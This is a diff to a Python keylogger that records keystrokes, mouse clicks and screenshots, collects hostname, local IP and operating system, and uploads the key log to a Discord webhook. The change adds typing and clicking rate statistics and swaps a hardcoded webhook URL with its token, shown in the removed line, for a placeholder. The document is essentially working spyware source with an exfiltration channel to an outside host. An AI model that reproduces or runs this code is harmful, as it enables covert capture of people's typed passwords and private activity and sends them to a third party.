@@ -5,18 +5,20 @@ import platform
 from pynput.keyboard import Key, Listener as KeyboardListener
 from pynput.mouse import Listener as MouseListener
 import time
-import pyperclip
 
 # Constants
 KEYS_INFORMATION_FILE = "key_log.txt"
-SCREENSHOT_INTERVAL_SECONDS = 5
-RUN_TIME_SECONDS = 60
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1160773937333018666/MqHAfoWi0vIBzTF8Z9_n_nHVcZ8W4I3Jo7SebkczEal7wQc3uCqOdIX-sJYBV9yMA4wJ"
+SCREENSHOT_INTERVAL_SECONDS = 15
+RUN_TIME_SECONDS = 180 #CHANGE THIS
+DISCORD_WEBHOOK_URL = "CHANGE_ME" #CHANGE THIS
+RUN_TIME_MINUTES = RUN_TIME_SECONDS / 60
 
 # Global variables
 keys_pressed = []
 mouse_clicks = []
 start_time = time.time()
+word_count = 0
+click_count = 0
 count = 0
 
 def get_ip_address():
@@ -36,15 +38,17 @@ def get_system_info():
     return hostname, local_ip, operating_system
 
 def on_key_press(key):
-    """Callback function to handle key press events."""
-    global keys_pressed
+    global keys_pressed, word_count
 
     keys_pressed.append((key, time.time()))
+    if key == Key.space:
+        word_count += 1
     write_data_to_file()
 
 def on_mouse_click(x, y, button, pressed):
-    """Callback function to record mouse clicks."""
+    global click_count
     if pressed:
+        click_count += 1
         mouse_clicks.append((x, y, button, time.time()))
         write_data_to_file()
 
@@ -88,10 +92,35 @@ def take_and_send_screenshot():
             print(f"Error while sending screenshot to Discord: {response.status_code}")
     except FileNotFoundError:
         print(f"Failed to open the screenshot file: {screenshot_filename}")
+def send_keylog_with_stats():
+    global end_time
+    end_time = time.time()
+
+    # Calculate CPM and WPM
+    clicks_per_minute = click_count / RUN_TIME_MINUTES
+    words_per_minute = word_count / RUN_TIME_MINUTES
+
+    with open(KEYS_INFORMATION_FILE, "rb") as f:
+        keylog = f.read()
+
+    hostname, local_ip, operating_system = get_system_info()
+    start_timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(start_time))
+    end_timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(end_time))
+
+    request_data = {
+        "username": "Keylogger",
+        "content": (
+            f"Hostname: {hostname}\nLocal IP: {local_ip}\nOperating System: {operating_system}\n"
+            f"Start Timestamp: {start_timestamp}\nEnd Timestamp: {end_timestamp}\n"
+            f"Clicks Per Minute: {clicks_per_minute:.2f}\nWords Per Minute: {words_per_minute:.2f}\nKey Log"
+        )
+    }
+    response = requests.post(DISCORD_WEBHOOK_URL, data=request_data, files={"key_log.txt": keylog})
+    if response.status_code != 200:
+        print(f"Error while sending key log to Discord: {response.status_code}")
 
 def main():
-    """Main function to start keylogger and mouse listener."""
-    print("Recording mouse clicks, keyboard input, and taking screenshots for 1 minute...")
+    print(f"Recording mouse clicks, keyboard input, and taking screenshots for {RUN_TIME_MINUTES:.1f} minutes...")
 
     with KeyboardListener(on_press=on_key_press) as key_listener, MouseListener(on_click=on_mouse_click) as mouse_listener:
         try:
@@ -101,22 +130,11 @@ def main():
         except KeyboardInterrupt:
             pass
 
-    # Send the key_log.txt to Discord
-    with open(KEYS_INFORMATION_FILE, "rb") as f:
-        keylog = f.read()
-    hostname, local_ip, operating_system = get_system_info()
-    current_timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-    request_data = {
-        "username": "Keylogger",
-        "content": f"Hostname: {hostname}\nLocal IP: {local_ip}\nOperating System: {operating_system}\nTimestamp: {current_timestamp}\nKey Log"
-    }
-    response = requests.post(DISCORD_WEBHOOK_URL, data=request_data, files={"key_log.txt": keylog})
-    if response.status_code != 200:
-        print(f"Error while sending key log to Discord: {response.status_code}")
+    send_keylog_with_stats()
 
-print("Recording completed.")
-   
+    print("Recording completed.")
 
 if __name__ == "__main__":
     main()
 
+    # one two three four five six seven eight nine ten eleven twelve
